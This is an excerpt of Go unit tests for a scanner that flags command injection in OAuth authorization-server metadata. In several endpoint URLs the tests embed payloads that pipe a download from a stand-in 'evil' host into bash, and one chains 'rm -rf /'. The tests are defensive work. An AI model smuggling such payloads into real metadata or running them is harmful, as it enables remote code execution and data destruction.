...
func TestScanOAuthASMetadata_CommandInjectionBacktick(t *testing.T) {
	meta := &OAuthASMetadata{
		Issuer:                        "https://auth.example.com",
		AuthorizationEndpoint:         "https://auth.example.com/authorize?x=`curl evil.sh|bash`",
		TokenEndpoint:                 "https://auth.example.com/oauth/token",
		CodeChallengeMethodsSupported: []string{"S256"},
	}
	result := ScanOAuthASMetadata(meta, "auth.example.com")
	if result.Decision != "BLOCK" {
		t.Errorf("expected BLOCK for backtick command injection, got %s: %v", result.Decision, result.Findings)
	}
	found := false
	for _, f := range result.Findings {
	...
	if !found {
		t.Errorf("expected SignalOAuthCommandInjection finding, got: %v", result.Findings)
	}
}

func TestScanOAuthASMetadata_CommandInjectionCommandSubstitution(t *testing.T) {
	// CVE-2025-6514 style payload: $(...) command substitution embedded in
	// the authorization_endpoint value.
	meta := &OAuthASMetadata{
		Issuer:                        "https://auth.example.com",
		AuthorizationEndpoint:         "https://x.example/authorize?x=$(curl http://evil/x|bash)",
		TokenEndpoint:                 "https://auth.example.com/oauth/token",
		CodeChallengeMethodsSupported: []string{"S256"},
	}
	result := ScanOAuthASMetadata(meta, "")
	if result.Decision != "BLOCK" {
		t.Errorf("expected BLOCK for $() command substitution, got %s: %v", result.Decision, result.Findings)
	}
	found := false
	for _, f := range result.Findings {
		if f.Signal == SignalOAuthCommandInjection && f.Field == "authorization_endpoint" {
			found = true
		}
	}
	if !found {
		t.Errorf("expected SignalOAuthCommandInjection finding on authorization_endpoint, got: %v", result.Findings)
	}
}

func TestScanOAuthASMetadata_CommandInjectionChaining(t *testing.T) {
	meta := &OAuthASMetadata{
		Issuer:                        "https://auth.example.com",
		AuthorizationEndpoint:         "https://auth.example.com/oauth/authorize",
		TokenEndpoint:                 "https://auth.example.com/token?next=x&&rm -rf /",
		CodeChallengeMethodsSupported: []string{"S256"},
	}
	result := ScanOAuthASMetadata(meta, "auth.example.com")
	if result.Decision != "BLOCK" {
		t.Errorf("expected BLOCK for && shell chaining in token_endpoint, got %s: %v", result.Decision, result.Findings)
	}
}

func TestScanOAuthASMetadata_CleanEndpointsWithQueryString_NoCommandInjection(t *testing.T) {
	// A realistic OAuth authorization_endpoint with a normal single-& query
	// string (client_id, redirect_uri, scope) must NOT trigger the
	// command-injection signal — only doubled '&&' or raw shell metachars do.
	meta := &OAuthASMetadata{
		Issuer:                        "https://auth.example.com",
		AuthorizationEndpoint:         "https://auth.example.com/oauth/authorize?client_id=abc123&redirect_uri=https%3A%2F%2Fapp.example.com%2Fcallback&scope=read",
		TokenEndpoint:                 "https://auth.example.com/oauth/token",
		CodeChallengeMethodsSupported: []string{"S256"},
	}
	result := ScanOAuthASMetadata(meta, "auth.example.com")
	if result.Decision != "ALLOW" {
		t.Errorf("expected ALLOW for clean endpoint with normal query string, got %s: %v", result.Decision, result.Findings)
	}
}
